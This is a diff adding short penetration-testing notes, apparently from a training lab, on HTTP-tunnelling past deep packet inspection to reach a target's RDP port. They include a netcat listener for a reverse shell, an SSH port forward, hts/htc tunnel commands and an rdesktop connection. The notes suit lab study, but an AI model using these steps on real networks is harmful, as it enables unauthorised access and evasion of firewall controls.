@@ -1,0 +1,41 @@
+=============================================
+HTTPTunnel-ing through deep packet inspection
+=============================================
+attacker --> network:1234 --> victim:1234 --target:8888--> target:3389
+
+misconfigured firewall
+	1234/tcp is not mapped any listening port
+
+firewall state
+	IN			OUT
+	80/tcp		<--->	*
+	443/tcp		<--->	*
+	1234/tcp	<--->	*
+	*		<-/->	*
+
+initial port forwarding state
+	INBOUND			FORWARD
+	80/tcp		<--->	victim
+	443/tcp		<--->	victim
+	1234/tcp	<--->	victim
+
+get a reverse shell on 443 port(attacker)
+	nc -nvlp 443
+	~~
+
+port forward(victim)
+	victim--> :8888 --> target:3389
+		ssh -L 0.0.0.0:<bind port>:<target ip>:<target port> <username>@127.0.0.1
+		ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
+
+	network:1234 --> target:8888(-->3389)
+		hts --forward-port localhost:<target port> <inbound port>
+		hts --forward-port localhost:8888 1234
+
+make http tunnel(attacker)
+	htc --forward-port <attacker port> <victim ip>:<victim target port>
+	htc --forward-port 8080 10.11.0.128:1234
+
+gain access toward target
+	rdesktop <localhost> <tunnel port>
+	rdesktop 127.0.0.1 8080
